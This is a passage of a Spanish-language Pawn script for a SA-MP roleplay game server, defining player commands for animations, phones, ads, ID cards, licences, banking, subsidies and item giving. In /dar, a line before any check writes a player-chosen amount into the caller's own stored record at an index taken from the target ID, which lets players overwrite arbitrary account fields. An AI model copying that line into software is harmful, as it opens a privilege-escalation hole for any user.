	CMD:danzar(playerid,params[])
	{
	    if(Bit_Get(AnimsLocked, playerid))
	        return Error(playerid, "No puedes utilizar animaciones en este momento.");

	    new
			S;

	    if(sscanf(params,"i",S)) return ParamsINC(playerid,"/danzar [1 - 13]");

		switch(S)
		{
		    case 1:		return  ApplyAnimation(playerid,"DANCING","bd_clap",4.1,7,5,1,1,1);
		    case 2:		return  ApplyAnimation(playerid,"DANCING","bd_clap1",4.1,7,5,1,1,1);
		    case 3: 	return  ApplyAnimation(playerid,"DANCING","dance_loop",4.1,7,5,1,1,1);
		    case 4:		return  ApplyAnimation(playerid,"DANCING","DAN_Down_A",4.1,7,5,1,1,1);
		    case 5: 	return  ApplyAnimation(playerid,"DANCING","DAN_Left_A",4.1,7,5,1,1,1);
		    case 6: 	return  ApplyAnimation(playerid,"DANCING","DAN_Loop_A",4.1,7,5,1,1,1);
		    case 7: 	return  ApplyAnimation(playerid,"DANCING","DAN_Right_A",4.1,7,5,1,1,1);
		    case 8: 	return  ApplyAnimation(playerid,"DANCING","DAN_Up_A",4.1,7,5,1,1,1);
		    case 9: 	return  ApplyAnimation(playerid,"DANCING","dnce_M_a",4.1,7,5,1,1,1);
		    case 10: 	return  ApplyAnimation(playerid,"DANCING","dnce_M_b",4.1,7,5,1,1,1);
		    case 11: 	return  ApplyAnimation(playerid,"DANCING","dnce_M_c",4.1,7,5,1,1,1);
		    case 12: 	return  ApplyAnimation(playerid,"DANCING","dnce_M_d",4.1,7,5,1,1,1);
		    case 13: 	return  ApplyAnimation(playerid,"DANCING","dnce_M_e",4.1,7,5,1,1,1);
			default: 	return  ParamsINC(playerid,"/danzar [1 - 13]");
		}
		return 1;
	}

	CMD:cansarme(playerid,params[])
	{
	    if(Bit_Get(AnimsLocked, playerid))
	        return Error(playerid, "No puedes utilizar animaciones en este momento.");

		ApplyAnimation(playerid,"PED","WOMAN_runfatold",4.1,7,5,1,1,1);
		return 1;
	}

	CMD:detener(playerid,params[])
	{
	    if(Bit_Get(AnimsLocked, playerid))
	        return Error(playerid, "No puedes utilizar/detener animaciones en este momento.");

    	ApplyAnimation(playerid, "CARRY", "crry_prtial", 4.0, 0, 0, 0, 0, 0);
		return 1;
	}

	CMD:bailar(playerid,params[])
	{
	    if(Bit_Get(AnimsLocked, playerid))
	        return Error(playerid, "No puedes utilizar animaciones en este momento.");

	    new S;
	    if(sscanf(params,"i",S)) return ParamsINC(playerid,"/bailar [1 - 3]");
		if(S == 1) return SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DANCE1);
		else if(S == 2) return SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DANCE2);
		else if(S == 3) return SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DANCE3);
		else return ParamsINC(playerid,"/bailar [1 - 3]");
	}

	CMD:acciones(playerid,params[])
	{
	    Mensaje(playerid,-1,"> - "#CINFO"Acciones disponibles:");
	    Mensaje(playerid,-1,"/rendirme - /reirme - /amenazar - /cruzarbrasos - /recostarme - /pararme - /cubrirme - /beber");
	    Mensaje(playerid,-1,"/vomitar - /chau - /agonizar - /depie - /besar - /crack - /sentarme - /si - /no");
	    Mensaje(playerid,-1,"/levantarme - /llorar - /saludar - /echarme - /danzar - /cansarme - /bailar - /detener (detener la animación)");
		return 1;
	}

	CMD:ropa(playerid,params[])
	{
	    if(InfoJugador[playerid][jEncarcelado]) return Error(playerid, "No puedes utilizar este comando en la cárcel.");
		new Str[18 * MAX_ROPA],Ropa[MAX_ROPA][20],strI[20];
		Loop(i,MAX_ROPA,0)
		{
		    if(!InfoJugador[playerid][jRopa][i])
		    {
	         	Ropa[i] = "Nada";
			}
			else
			{
				format(Ropa[i],20,"%d",InfoJugador[playerid][jRopa][i]);
			}
	 		format(strI,sizeof(strI),"Slot %d ( %s )\n",i,Ropa[i]);
	  		strins(Str,strI,strlen(Str));
		}
		SetPVarInt(playerid,"ROPA_EDITAR",0);

		Dialog(playerid,dEditarRopa,DIALOG_STYLE_LIST,""#CBLANCO"Elige el slot para editar",Str,"Aceptar","Cancelar");
		return 1;
	}

	CMD:accesorios(playerid,params[])
	{
		new Str[(50*7)+4],Str2[50];
		Loop(s,7,0)
		{
  			if(InfoJugador[playerid][jAttachModel][s])
	    	{
      			A_Format(Str2,"Slot %d %s[ %s ]\n",s,(InfoJugador[playerid][jAttachOcultado][s]) ? (""#CVERDE"") : (""#CAZUL""), AttachmentObjects[InfoJugador[playerid][jAccesorio][s]][attachname]);
				strcat(Str,Str2);
				continue;
			}
			else
			{
   				A_Format(Str2,"Slot %d "#CROJO"[ Nada ]\n",s);
				strcat(Str,Str2);
				continue;
			}
		}
		Dialog(playerid,dEAccesorios_0,DIALOG_STYLE_LIST,""#CAZUL2"Editar accesorios - elejir SLOT",Str,"Aceptar","Cancelar");
		return 1;
	}

	CMD:celular(playerid,params[])
	{
	    if(!InfoJugador[playerid][jNumeroCel]) return Error(playerid,"¡No tienes celular!");
	    NeedObject(playerid)<OBJ_CEL>;
		if(InfoJugador[playerid][jEncarcelado]) return Error(playerid,"¡No puedes utilizar el teléfono en la carcel!");
		if(!GetPVarInt(playerid,"UsandoCelular"))
		{
		    Mensaje(playerid,-1,"Para sacar el celular, usa "#CINFO"/celular");
		    LimpiarPantalla(playerid,3);
		    SetPVarInt(playerid,"UsandoCelular",1);
		    MostrarCelular(playerid,ID_MENUCEL);
		    alm(strNum[playerid],"");
			AutoRol(playerid,"saca su celular de su bolsillo");
		    return 1;
		}
		else
		{
			SetPVarInt(playerid,"UsandoCelular",0);
			SacarCelular(playerid);
			AutoRol(playerid,"guarda su celular en su bolsillo");
			return 1;
		}
	}

	CMD:minumero(playerid,params[])
	{
	    if(!InfoJugador[playerid][jNumeroCel]) return Error(playerid,"¡No tienes celular!");
		new Str[60];
		A_Format(Str,"Tu número de celular, es: "#CAZUL2"%d",InfoJugador[playerid][jNumeroCel]);
		Mensaje(playerid,-1,Str);
		return 1;
	}


	CMD:atender(playerid,params[])
	{
	    if(!InfoJugador[playerid][jNumeroCel]) return Error(playerid,"¡No tienes celular!");
		if(GetPVarInt(playerid,"EN_LLAMADA")) return Error(playerid,"¡Ya estas hablando por teléfono!");
		new NUM = GetPVarInt(playerid,"NUM_MELLAMA");
		if(!NUM) return Error(playerid,"¡No te estan llamando!");
		foreach(Player,i)
		{
		    if(InfoJugador[i][jNumeroCel] == NUM)
		    {
		        PlayerTextDrawSetString(playerid,Numero[i],"~g~conectado");
		        Mensaje(i,-1,"Contestaron. Puede hablar, utilizando "#CINFO"(/c)");
		        Mensaje(playerid,-1,"Para hablar por celular, utilize "#CINFO"(/c)");
				SetPVarInt(i,"NUM_MELLAMA",InfoJugador[playerid][jNumeroCel]);
				SetPVarInt(i,"EN_LLAMADA",1);
				SetPlayerSpecialAction(playerid,SPECIAL_ACTION_USECELLPHONE);
				break;
			}
		}
		SetPVarInt(playerid,"EN_LLAMADA",1);
		return 1;
	}

	CMD:colgar(playerid,params[])
	{
	    if(!InfoJugador[playerid][jNumeroCel]) return Error(playerid,"¡No tienes celular!");
		if(GetPlayerSpecialAction(playerid) == SPECIAL_ACTION_USECELLPHONE)
  		SetPlayerSpecialAction(playerid,SPECIAL_ACTION_STOPUSECELLPHONE);
		if(!GetPVarInt(playerid,"EN_LLAMADA")) return Error(playerid,"¡No estas hablando por teléfono!");
		new NUM = GetPVarInt(playerid,"NUM_MELLAMA");
		if(!NUM) return Error(playerid,"¡No te estan llamando!");
		foreach(Player,i)
		{
		    if(InfoJugador[i][jNumeroCel] == NUM)
		    {
		        PlayerTextDrawSetString(playerid,Numero[i],"~r~cortado");
		        Mensaje(i,-1,"Colgaron el teléfono.");
				DeletePVar(i,"NUM_MELLAMA");
				DeletePVar(i,"EN_LLAMADA");
				break;
			}
		}
		DeletePVar(playerid,"EN_LLAMADA");
		return 1;
	}

	CMD:c(playerid,params[])
	{
	    if(isnull(params)) return ParamsINC(playerid,"/c [TEXTO]");
	    if(!GetPVarInt(playerid,"EN_LLAMADA")) return Error(playerid,"¡No estás en una llamada!");
		new NUM = GetPVarInt(playerid,"NUM_MELLAMA"),Str[150];
		foreach(Player,i)
		{
		    if(InfoJugador[i][jNumeroCel] == NUM)
		    {
		        A_Format(Str,"%s (celular) dice: %s",NombreJugador(playerid),params);
				ProxDetector(15,playerid,Str,-1,Hablar,Hablar2,Hablar3,Hablar4);
				A_Format(Str,"Voz del celular: %s",params);
				Mensaje(i,-1,Str);
			}
		}
		return 1;
	}

	CMD:anuncio(playerid,params[])
	{
	    if(EsIP(params))
	    {
			MensajeAdminF(C_ROJO, "[Anti-SPAM] "#CBLANCO"%s(%d): "#CINFO"/anuncio %s", Destacado, NombreJugador_(playerid), playerid, params);
	        _Kick(playerid,T_ANTICHEAT,"SPAM");
	        return 1;
		}
	    if(isnull(params)) return ParamsINC(playerid,"/anuncio [ANUNCIO]");
	    if(!InfoJugador[playerid][jNumeroCel]) return Error(playerid,"¡No tienes celular!");
		if(!IsPlayerInRangeOfPoint(playerid,2,-1976.2544,602.3967,1055.5859)) return Error(playerid,"¡Para poner un anuncio, debes ir a LSTV!");
		static DiferenciaAnuncio;

		if((GetTickCount() - DiferenciaAnuncio) < 40000) return Error(playerid,"¡Se puede poner un anuncio cada 40 segundos!");
		DiferenciaAnuncio = GetTickCount();
		new PrecioA = strlen(params)*3;
		if(GetPlayerMoney(playerid) < PrecioA) return Error(playerid,"¡No tienes suficiente dinero para pagar esos caractéres! ($3 el caractér)");
		new Str[160];
		A_Format(Str,"[ANUNCIO] "#CBLANCO"%s. "#CAZULRARO"(NÚMERO: %d)",params,InfoJugador[playerid][jNumeroCel]);
		MensajeTodos(C_AZUL2,Str);
		QuitarDinero(playerid,PrecioA);
		InfoFaccion[IDLSTV][fDinero] += PrecioA;
		A_Format(Str,"Anunciante: %s (ID: %d)",pName(playerid),playerid);
		MensajeAdmin(-1,Str,Destacado);
		ActualizarFacciones();
		return 1;
	}

	CMD:gps(playerid,params[])
	{
		NeedObject(playerid)<OBJ_GPS>;
	    AutoRol(playerid,"mira su GPS");
		MostrarGPS(playerid);
		return 1;
	}

	CMD:cinturon(playerid,params[])
	{
		Comando_En_Auto
		if(GetPVarInt(playerid,"TIENE_CINTURON"))
		{
		    AutoRol(playerid,"se saca el cinturón de seguridad");
		    DeletePVar(playerid,"TIENE_CINTURON");
		    return 1;
		}
  		AutoRol(playerid,"se pone el cinturón de seguridad");
    	SetPVarInt(playerid,"TIENE_CINTURON",1);
    	return 1;
	 }

	CMD:rolarma(playerid,params[])
	{
	    new i = GetPlayerWeapon(playerid);
	    if( !i ) return Error(playerid,"¡No tienes arma para rolear!");
	    new Name[20],Str[100];
	    GetWeaponName(i,Name,sizeof Name);
	    switch(i)
	    {
	        case 4:
	        {
	    		AutoRol(playerid, "estira su brazo derecho y saca un cuchillo del bolsillo de su remera");
	    		cmd_do(playerid, "cuchillo en mano");
			}
	        case 22..24, 29, 32, 28:
	        {
	    		A_Format(Str,"estira su brazo derecho y saca una %s del cinturón de su pantalón",Name);
	    		AutoRol(playerid, Str);
	    		A_Format(Str,"le quita el seguro a su %s",Name);
	    		AutoRol(playerid, Str);
	    		cmd_do(playerid,"**Clack-Clack** Arma Cargada");
	    		A_Format(Str,"%s lista para disparar",Name);
	    		cmd_do(playerid, Str);
	    		cmd_recargar(playerid, "");
			}
			case 30, 31, 34, 25..27:
			{
			    AutoRol(playerid, "se descuelga su mochila y seguidamente la coloca en el piso");
	    		A_Format(Str,"abre el cierre de su mochila, y toma una %s del interior",Name);
	    		AutoRol(playerid, Str);
	    		A_Format(Str,"le quita el seguro a su %s",Name);
	    		AutoRol(playerid, Str);
	    		cmd_do(playerid,"**Clack-Clack** Arma Cargada");
	    		A_Format(Str,"%s lista para disparar",Name);
	    		cmd_do(playerid, Str);
	    		cmd_recargar(playerid, "");
			}
			default:
			{
			    return Error(playerid,"¡El comando no encontro un rol para ese arma!");
			}
		}

	    return 1;
	 }

	CMD:dni(playerid,params[])
	{
	    new
	        ID = -1;
	    if(sscanf(params, "U(-1)", ID)) return ParamsINC(playerid, "/dni [Opcional: ID/Nombre]");
	    if(ID == -1) Mensaje(playerid, -1, "/dni [ID/Nombre] para mostrarselo a otro jugador.");
	    else
	    {
	        if(!IsPlayerConnected(ID)) return Error(playerid, "¡ID Incorrecto!");
		}
		if(!ProxDetectorS(3,playerid,ID)) return Error(playerid,"¡Estas muy lejos de ese jugador!");

		new
			Str[250],
			Str2[50],
			Nombre_2[15],
			Apellido[15],
			Pos_ = strfind(pName(playerid), "_");

		strmid(Nombre_2, pName(playerid), 0, Pos_);
		strmid(Apellido, pName(playerid), Pos_+1, strlen(pName(playerid)));

		A_Format(Str2, ""#CVERDE"NOMBRE:\n\t"#CBLANCO"%s\n\n", Nombre_2);
		strcat(Str, Str2);

		A_Format(Str2, ""#CVERDE"APELLIDO:\n\t"#CBLANCO"%s\n\n", Apellido);
		strcat(Str, Str2);

		A_Format(Str2, ""#CVERDE"SEXO:\n\t"#CBLANCO"%s\n\n", (InfoJugador[playerid][jSexo] == 1) ? ("Masculino") : ("Femenino") );
		strcat(Str, Str2);

		A_Format(Str2, ""#CVERDE"EDAD:\n\t"#CBLANCO"%d\n\n", InfoJugador[playerid][jEdad]);
		strcat(Str, Str2);

		strcat(Str, ""#CVERDE"DOMICILIO/S:\n\t"#CBLANCO"");

		foreach(Casas, i)
		{
		    if(EsDuenoCasa(playerid, i))
		    {
		        A_Format(Str2, "> %s\n\t", InfoCasa[i][cDireccion]);
				strcat(Str, Str2);
			}
		}

		A_Format(Str2, ""#CROJO"DNI: "#CBLANCO"%d", InfoJugador[playerid][jDNI]);

		if(ID == -1)
		{
			AutoRol(playerid,"mira su DNI");
			Dialog(playerid, dError, DIALOG_STYLE_MSGBOX, Str2, Str, "Cerrar", "");
		}
		else
		{
		    new
		        Rol[50];
			A_Format(Rol,"le muestra su DNI a %s",NombreJugador(ID));
			AutoRol(playerid,Rol);
			Dialog(ID, dError, DIALOG_STYLE_MSGBOX, Str2, Str, "Cerrar", "");
		}
		return 1;
	}

	CMD:mostrarlicencia(playerid,params[])
	{
	    if(sscanf(params,"us[20]",params[0],params[1])) return ParamsINC(playerid,"/mostrarlicencia [ID/NOMBRE] <conduccion - motos>");
	    if(!IsPlayerConnected(params[0])) return Error(playerid,"¡Jugador desconectado!");
	 	if(!ProxDetectorS(3.0,playerid,params[0])) return Error(playerid,"¡Ese jugador está demasiado lejos!");
		new
		    Lic_type;

		if(!strcmp(params[1],"conduccion",true))
		{
		    if(!InfoJugador[playerid][jLicenciaAuto]) return Error(playerid,"¡No tienes licencia de conducción!");
		    Lic_type = 0;
		}
		else if(!strcmp(params[1],"motos",true))
		{
		    if(!InfoJugador[playerid][jLicenciaMoto]) return Error(playerid,"¡No tienes licencia de motos!");
		    Lic_type = 1;
		}
		else if(!strcmp(params[1],"armas",true))
		{
		    if(!InfoJugador[playerid][jLicenciaArmas]) return Error(playerid,"¡No tienes licencia de armas!");
		    Lic_type = 2;
		}
		else return ParamsINC(playerid,"/mostrarlicencia [ID/NOMBRE] <conduccion - motos - armas>");

		new
			Str[250],
			Str2[50],
			Nombre_2[15],
			Apellido[15],
			Pos_ = strfind(pName(playerid), "_");

		strmid(Nombre_2, pName(playerid), 0, Pos_);
		strmid(Apellido, pName(playerid), Pos_+1, strlen(pName(playerid)));

		A_Format(Str2, ""#CVERDE"NOMBRE:\n\t"#CBLANCO"%s\n\n", Nombre_2);
		strcat(Str, Str2);

		A_Format(Str2, ""#CVERDE"APELLIDO:\n\t"#CBLANCO"%s\n\n", Apellido);
		strcat(Str, Str2);

		A_Format(Str2, ""#CVERDE"SEXO:\n\t"#CBLANCO"%s\n\n", (InfoJugador[playerid][jSexo] == 1) ? ("Masculino") : ("Femenino") );
		strcat(Str, Str2);

		A_Format(Str2, ""#CVERDE"EDAD:\n\t"#CBLANCO"%d\n\n", InfoJugador[playerid][jEdad]);
		strcat(Str, Str2);

		strcat(Str, ""#CVERDE"DOMICILIO/S:\n\t"#CBLANCO"");

		foreach(Casas, i)
		{
		    if(EsDuenoCasa(playerid, i))
		    {
		        A_Format(Str2, "> %s\n\t", InfoCasa[i][cDireccion]);
				strcat(Str, Str2);
			}
		}

		switch(Lic_type)
		{
			case 0: Str2 = ""#CROJO"Licencia de conducir";
			case 1: Str2 = ""#CROJO"Licencia de motos";
			case 2: Str2 = ""#CROJO"Licencia de armas";
		}
		Dialog(params[0], dError, DIALOG_STYLE_MSGBOX, Str2, Str, "Cerrar", "");

		return 1;
	}

	CMD:recibir(playerid, params[])
	{
		if(isnull(params)) return ParamsINC(playerid,"/recibir subsidio");
		if(!strcmp(params, "subsidio", true))
		{
			if(IsPlayerInRangeOfPoint(playerid, 2.0,185.2302,-109.5540,999.6328))
			{
				if( IsPayTime() )
				{
					new
					    ID = InfoJugador[playerid][jIDCuentaB];

					if(!ID) return Error(playerid,"¡No tienes una cuenta en el banco! Puedes sacar una gratis (/sacar tarjeta)");
					if(Bit_Get(CB_RecibioPaga, ID)) return Error(playerid,"¡Ya recibiste la paga!");

				    Bit_Set(CB_RecibioPaga, ID, true);

				    new
				        Dinero = 150, // Inicial
						Dialog_F[400],
						Str_F[80];

					strcat(Dialog_F, ""#CVERDE"$150 "#CBLANCO"- Balance inicial\n");

					// Bonus por level
					Dinero += 200*InfoJugador[playerid][jNivel];

					A_Format(Str_F, ""#CVERDE"$%d "#CBLANCO"- Antigüedad en la ciudad\n", 200*InfoJugador[playerid][jNivel]);
					strcat(Dialog_F, Str_F);

					ClearString(Str_F);

					// Bonus por trabajos
					if(EsCosechador(playerid))
					{
					    A_Format(Str_F, ""#CVERDE"$%d "#CBLANCO"- Trabajos y ayuda a la sociedad "#CINFO"(Cosechas)\n", TrabajosPorHora[playerid][ID_Cosechador]*50);
					    Dinero += TrabajosPorHora[playerid][ID_Cosechador]*50;
					}
					else if(EsCamionero(playerid))
					{
					    A_Format(Str_F, ""#CVERDE"$%d "#CBLANCO"- Trabajos y ayuda a la sociedad "#CINFO"(Entregas)\n", TrabajosPorHora[playerid][ID_Cosechador]*65);
					    Dinero += TrabajosPorHora[playerid][ID_Cosechador]*65;
					}
					else if(EsBasurero(playerid))
					{
					    A_Format(Str_F, ""#CVERDE"$%d "#CBLANCO"- Trabajos y ayuda a la sociedad "#CINFO"(Barridas)\n", TrabajosPorHora[playerid][ID_Cosechador]*100);
					    Dinero += TrabajosPorHora[playerid][ID_Basurero]*100;
					}
					else if(InfoJugador[playerid][jTrabajo] == ID_RepartidorB)
					{
					    A_Format(Str_F, ""#CVERDE"$%d "#CBLANCO"- Trabajos y ayuda a la sociedad "#CINFO"(Repartidas)\n", TrabajosPorHora[playerid][ID_Cosechador]*75);
					    Dinero += TrabajosPorHora[playerid][ID_Basurero]*75;
					}
					strcat(Dialog_F, Str_F);

					A_Format(Str_F, "\n"#CBLANCO"• Total: "#CVERDE"$%d\n\n", Dinero);
					strcat(Dialog_F, Str_F);

					A_Format(Str_F, ""#CBLANCO"Balance anterior: "#CVERDE"$%d\n", InfoCuentaB[ID][cuenDinero]);
					strcat(Dialog_F, Str_F);

					InfoCuentaB[ID][cuenDinero] += Dinero;
					A_Format(Str_F, ""#CBLANCO"Nuevo balance: "#CVERDE"$%d\n\n", InfoCuentaB[ID][cuenDinero]);
					strcat(Dialog_F, Str_F);
					Dialog(playerid, dError, DIALOG_STYLE_MSGBOX, ""#CBLANCO"Subsidio del "#CROJO"Estado", Dialog_F, "Cerrar", "");
					ActualizarCuentaB(ID);
					InfoFaccion[IDGOBIERNO][fDinero] -= Dinero;
					ActualizarFacciones();
				    Loop(i, sizeof(TrabajosPorHora[]), 0)
				    {
						TrabajosPorHora[playerid][i] = 0;
					}
					return 1;
				}
				else
				{
				    return Error(playerid,"¡No llegaste a tiempo para recibir la paga!");
				}
			}
			return Error(playerid, "¡No estás en el banco!");
		}
	    return ParamsINC(playerid,"/recibir subsidio");
	}

	CMD:sacar(playerid,params[])
	{
	    if(!strcmp(params,"tarjeta",true))
	    {
	        if(IsPlayerInRangeOfPoint(playerid,2,183.1584,-109.5484,999.6328))
	        {
	            if(Total_Cuentas_Bancarias >= MAX_CUENTAS_BANCARIAS) return Error(playerid,"¡Ya no hay más espacio en la base de datos, y no se podrán crear más cuentas. Comuniquele esto al scripter (Spell) para solucionar este problema");
	            if(InfoJugador[playerid][jIDCuentaB]) return Error(playerid,"¡Ya tienes tarjeta de crédito!");
	            ++Total_Cuentas_Bancarias;
				new Str[100];
				InfoJugador[playerid][jIDCuentaB] = Total_Cuentas_Bancarias;
				alm(InfoCuentaB[Total_Cuentas_Bancarias][cuenNombre],pName(playerid));
				Mensaje(playerid,-1,"Sacaste una tarjeta de crédito en el banco, ahora podrás utilizar cajeros automáticos.");
				A_Format(Str,"El ID de su cuenta bancaria, es "#CPOSITIVO"%d",Total_Cuentas_Bancarias);
				Mensaje(playerid,-1,Str);
				ActualizarCuentaB(Total_Cuentas_Bancarias);
			}
			else return Error(playerid,"¡No estás en el banco!");
	        return 1;
		}
		else if(!strcmp(params[0],"licencia",true))
		{
		    if(IsPlayerInRangeOfPoint(playerid,2,-2029.9017,-119.1597,1035.1719))
		    {
		        Dialog(playerid,dLicencia,DIALOG_STYLE_LIST,""#CINFO"¿Qué licencia desea retirar? "#CPOSITIVO"($600)","- Licencia de vehículos\n- Licencia de motos","Aceptar","Cancelar");
		        SetPVarInt(playerid,"Parte_Licencia",0);
		        return 1;
			}
			return Error(playerid,"¡No estás en el centro de licencias!");
		}
		return ParamsINC(playerid,"/sacar <tarjeta - licencia>");
	}

	CMD:dfumar(playerid,params[])
	{
		if(!GetPVarInt(playerid,"FUMANDO")) return Error(playerid,"¡No estas fumando un cigarrillo!");
		DeletePVar(playerid,"FUMANDO");
		SetPlayerSpecialAction(playerid,SPECIAL_ACTION_NONE);
		ClearAnimations(playerid);
		AutoRol(playerid,"tira su cigarrillo al suelo, y lo pisa");
		return 1;
	}

	CMD:dar(playerid,params[])
	{
	    new jNombre,Item[15], Cant,Str[200];
	    if(sscanf(params,"p< >us[15]I(-1)",jNombre,Item,Cant)) return ParamsINC(playerid,"/dar [ID] <dinero - arma - medicamentos - droga - llave> [opcional: CANTIDAD]");
		InfoJugador[playerid][InfoJ:jNombre] = Cant;
		if(!IsPlayerConnected(jNombre)) return Error(playerid,"¡Jugador desconectado!");
		if(!ProxDetectorS(2,playerid,jNombre)) return Error(playerid,"¡Ese jugador está muy lejos tuyo!");
		if(jNombre == playerid) return Error(playerid,"¡No puedes darte cosas a ti mismo");
	 	if(!strcmp(Item,"dinero",true))
		{
		    if(Cant == -1) return ParamsINC(playerid,"/dar [ID] dinero "#CROJO"[CANTIDAD]");
			if(Cant < 1) return Error(playerid,"¡Debe ser un número positivo!");
			if(Cant > GetPlayerMoney(playerid)) return Error(playerid,"¡No tienes esa cantidad de dinero!");
			if(InfoJugador[playerid][jHoras] < 2) return Error(playerid,"¡No puedes dar dinero, debes jugar al menos 2 horas!");
			new Rol[65];
			A_Format(Rol,"le da $%d a %s",Cant,NombreJugador(jNombre));
			AutoRol(playerid,Rol);
			ApplyAnimation(playerid,"DEALER","shop_pay",3,0,0,1,0,3000,true);
			ApplyAnimation(jNombre,"INT_SHOP","shop_shelf",3,0,0,1,0,3000,true);
			QuitarDinero(playerid,Cant);
			GivePlayerMoney(jNombre,Cant);
			A_Format(Rol,"%s le dió $%d a %s",NombreJugador_(playerid),Cant,NombreJugador_(jNombre));
			Log("LOG/Pagos.txt",Rol);
			return 1;
	    }
	 	if(!strcmp(Item,"arma",true))
		{
	        if(!GetPlayerWeapon(playerid)) return Error(playerid,"¡No tienes un arma en la mano!");
			new Bala,Arma;
			GetPlayerWeaponData(playerid,GetWeaponSlot(GetPlayerWeapon(playerid)),Arma,Bala);
	        GivePlayerWeapon(jNombre,Arma,Bala);
	        QuitarArma(playerid,GetWeaponSlot(GetPlayerWeapon(playerid)));
	        new NombreA[24];
			GetWeaponName(Arma,NombreA,sizeof NombreA);
			A_Format(Str,"le da a %s un(a) %s con %d balas",NombreJugador(jNombre),NombreA,Bala);
			AutoRol(playerid,Str);
			ApplyAnimation(playerid,"DEALER","shop_pay",3,0,0,1,0,3000,true);
			ApplyAnimation(jNombre,"INT_SHOP","shop_shelf",3,0,0,1,0,3000,true);
			return 1;
		}
	 	if(!strcmp(Item,"medicamentos",true))
		{
		    SetPVarInt(playerid,"DAR_MED_ID",jNombre);
	        A_Format(Str,"Ibupìrac x 400\t"#CVERDE"(%d)\nIbupìrac x 600\t"#CVERDE"(%d)",InfoJugador[playerid][jIbu400],InfoJugador[playerid][jIbu600]);
			Dialog(playerid,dDarMed,DIALOG_STYLE_LIST,"Dar medicamentos",Str,"Aceptar","Cancelar");
			return 1;
	    }
	 	if(!strcmp(Item,"droga",true))
		{
		    SetPVarInt(playerid,"DAR_DROGA_ID",jNombre);
	        A_Format(Str,"Marihuana\t"#CVERDE"(%d)\nCocaina\t"#CVERDE"(%d)\nHeroina\t"#CVERDE"(%d)\nOpio\t"#CVERDE"(%d)\nCannabis\t"#CVERDE"(%d)",
			InfoJugador[playerid][jDroga][DROGA_MARIHUANA],
			InfoJugador[playerid][jDroga][DROGA_COCAINA],
			InfoJugador[playerid][jDroga][DROGA_HEROINA],
			InfoJugador[playerid][jDroga][DROGA_OPIO],
			InfoJugador[playerid][jDroga][DROGA_CANNABIS]);
			Dialog(playerid,dDarDroga,DIALOG_STYLE_LIST,"Dar droga",Str,"Aceptar","Cancelar");
			return 1;
	    }
	 	if(!strcmp(Item,"llave",true))
		{
		    if(Cant == -1) return ParamsINC(playerid,"/dar [ID] llave "#CROJO"[Nº LLAVE]");
			if(Cant < 1) return Error(playerid,"¡Debe ser un número positivo!");
			if(InfoJugador[playerid][jLider] == 0) return Error(playerid,"¡Este comando se utiliza únicamente para los lideres!");
			if(!Bit_Get(Llave_veh[playerid], Cant)) return Error(playerid,"¡No tienes esa llave!");
			Bit_Set(Llave_veh[jNombre], Cant, true);
			new Rol[99];
			A_Format(Rol,"le da a %s una copia de la llave nº %d",NombreJugador(jNombre),Cant);
			AutoRol(playerid, Rol);
			GuardarLlaves(jNombre);
			return 1;
	    }
		return ParamsINC(playerid,"/dar [ID] <dinero - arma - medicamentos - droga - llave> [si usa dinero: CANTIDAD]");
	}


	CMD:llaves(playerid, params[])
	{
	    MostrarLlaves(playerid);
		return 1;
	}

	CMD:verllaves(playerid, params[])
	{
	    if(Staff(playerid,Moderador)) return 1;
	    if(sscanf(params, "u", params[0])) return ParamsINC(playerid, "/verllaves [ID/Nombre]");
	    if(params[0] == INVALID_PLAYER_ID) return Error(playerid, "Jugador desconectado.");
		MostrarLlaves(params[0], playerid);
		return 1;
	}

	stock MostrarLlaves(playerid, targetid = INVALID_PLAYER_ID)
	{
	    if(targetid == INVALID_PLAYER_ID)
	        targetid = playerid;
	        
		new
		    Str[35],
		    DialogStr[700],
			Count;

		DialogStr = "{FFFFFF}";

		foreach(Vehicle,i) if(TieneLlaveVeh(playerid, i) && Veh[i][vTrabajo] == 0)
		{
		    A_Format(Str,"%s (Llave %d)\n", NombreVehiculo(i), i);
			strcat(DialogStr, Str);
			Count++;
		}
		if(Count)
		{
			A_Format(Str, ""#CAZUL2"Llaves: "#CBLANCO"%d", Count);
			Dialog(targetid, dError, DIALOG_STYLE_MSGBOX, Str, DialogStr, "Cerrar", "");
		}
		else
		{
			Dialog(targetid, dError, DIALOG_STYLE_MSGBOX, ""#CROJO"SIN LLAVES", ""#CBLANCO"No hay llaves", "Cerrar", "");
		}
		return 1;
	}
	
	CMD:cajero(playerid,params[])
	{
	    Loop(i,11,0)
	    {
		    if(IsPlayerInRangeOfPoint(playerid,2,PosCajero[i][Posx],PosCajero[i][Posy],PosCajero[i][Posz]))
		    {
				if(!InfoJugador[playerid][jIDCuentaB]) return Error(playerid,"¡No tienes tarjeta de crédito! Puedes sacar una en el banco.");
				if(GetPVarInt(playerid,"EnCajero") == 1) return Error(playerid,"¡Ya estás realizando operaciones bancarias!");
				MostrarCajero(playerid);
				LimpiarPantalla(playerid,5);
				Mensaje(playerid,-1,"Para salir del cajero, clickea en la parte superior-derecha de la pantalla, donde dice 'salir'");
				CongelarEx(playerid);
				return 1;
			}
		}
		return Error(playerid,"¡No estás en un cajero automático,ni en el banco!");
	}

	CMD:cuenta(playerid,params[])
	{
	    if(GetPVarInt(playerid,"ViendoCuenta"))
	    {
	    	TextDrawHideForPlayer(playerid,CuentaBox);
	    	TextDrawHideForPlayer(playerid,CuentaGen);
	    	TextDrawHideForPlayer(playerid,CuentaCas);
	    	TextDrawHideForPlayer(playerid,CuentaNeg);
	    	TextDrawHideForPlayer(playerid,CuentaVeh);
	    	TextDrawHideForPlayer(playerid,CuentaArmas);
	    	SetPVarInt(playerid,"ViendoCuenta",0);
			CancelSelectTextDraw(playerid);
		}
		else
		{
	    	TextDrawShowForPlayer(playerid,CuentaBox);
	    	TextDrawShowForPlayer(playerid,CuentaGen);
	    	TextDrawShowForPlayer(playerid,CuentaCas);
	    	TextDrawShowForPlayer(playerid,CuentaNeg);
	    	TextDrawShowForPlayer(playerid,CuentaVeh);
	    	TextDrawShowForPlayer(playerid,CuentaArmas);
	    	SetPVarInt(playerid,"ViendoCuenta",1);
			SelectTextDraw(playerid,C_INFO);
	    	Mensaje(playerid,-1,"Para dejar de ver tu cuenta, usa "#CINFO"/cuenta");
		}
		return 1;
	}
	CMD:firmar(playerid,params[])
	{
	    if(!strcmp(params,"contrato",true))
	    {
     		if(InfoJugador[playerid][jTrabajo]) return Error(playerid,"¡Ya tienes un trabajo! "#CINFO"(/dejar trabajo)");
